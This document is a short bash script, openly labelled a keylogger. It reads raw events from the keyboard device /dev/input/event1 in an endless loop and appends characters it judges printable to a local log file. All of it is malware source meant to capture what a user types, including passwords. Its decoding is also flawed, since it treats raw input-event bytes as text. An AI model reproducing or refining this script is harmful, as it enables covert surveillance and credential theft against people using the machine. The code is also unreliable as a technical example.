#!/bin/bash

# Keylogger script

# Log file
LOG_FILE="keylog.txt"

# Device file for keyboard
KEYBOARD_DEVICE="/dev/input/event1"

# Open the keyboard device file in read-only mode
exec 3< "$KEYBOARD_DEVICE"

# Infinite loop to read keystrokes
while true; do
    # Read 16 bytes from the keyboard device file
    KEYS_DATA=$(dd bs=16 count=1 <&3 2>/dev/null)

    # Check if the read operation was successful
    if [ -n "$KEYS_DATA" ]; then
        # Convert the raw data to ASCII characters
        KEY=$(echo "$KEYS_DATA" | hexdump -e '16/1 "%c" "\n"')

        # Check if the key is a printable character
        if [[ "$KEY" =~ [[:print:]] ]]; then
            # Log the key to the log file
            echo -n "$KEY" >> "$LOG_FILE"
        fi
    fi
done
